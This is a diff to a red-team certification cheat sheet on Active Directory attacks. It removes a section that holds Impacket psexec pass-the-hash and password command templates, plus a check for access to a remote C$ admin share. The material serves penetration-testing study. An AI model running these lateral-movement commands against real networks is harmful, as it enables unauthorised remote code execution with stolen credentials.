@@ -1,7 +1,6 @@
 # CRTP
 
 # Summary
-* [General](#General)
 * [Domain Enumeration](#Domain-Enumeration)
     * [Powerview Domain](#Powerview-Domain)
     * [Powerview Users, groups and computers](#Powerview-users-groups-and-computers) 
@@ -41,29 +40,6 @@
       * [Trust flow](#Trust-flow) 
       
    
-# General
-#### Access C disk of a computer (check local admin)
-```
-ls \\<computername>\c$
-```
-
-#### Use this parameter to not print errors powershell
-```
--ErrorAction SilentlyContinue
-```
-
-#### Rename powershell windows
-```
-$host.ui.RawUI.WindowTitle = "<naam>"
-```
-
-#### Impacket PSexec impacket
-If no LM Hash use an empty one: ```aad3b435b51404eeaad3b435b51404ee```
-```
-python3 psexec.py -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME>@<TARGET>
-python3 psexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>
-```
-
 # Domain Enumeration
 ## Powerview Domain
 https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
